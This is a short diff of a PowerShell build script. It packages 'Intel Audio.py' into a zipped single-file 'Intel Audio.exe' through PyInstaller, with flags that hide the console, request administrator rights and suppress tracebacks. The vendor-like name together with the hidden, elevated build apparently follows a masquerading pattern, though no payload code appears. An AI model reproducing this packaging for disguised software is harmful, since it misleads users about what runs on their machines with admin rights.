@@ -5,6 +5,13 @@ $DistFile    = "$DistPath\Intel Audio.exe"
 $DistZip     = "$DistPath\Intel Audio.zip"
 
 
-powershell  $venvScript
-pyinstaller --clean --onefile --nowindowed --noconsole --hide-console hide-early -i .\icon.ico --uac-admin --disable-windowed-traceback --bootloader-ignore-signals '.\Intel Audio.py'
-Compress-Archive -Path $DistFile -DestinationPath $DistZip
+pyinstaller --clean --onefile --nowindowed --noconsole --hide-console hide-early -i .\icon.ico --uac-admin --disable-windowed-traceback '.\Intel Audio.py'
+if (-Not (Test-Path $DistZip)) {
+    Compress-Archive -Path $DistFile -DestinationPath $DistZip
+    Write-Output "Dist zip created"
+} else {
+    Remove-Item -Force -Path $DistZip
+    Write-Output "Dist zip removed"
+    Compress-Archive -Path $DistFile -DestinationPath $DistZip
+    Write-Output "Dist zip created"
+}
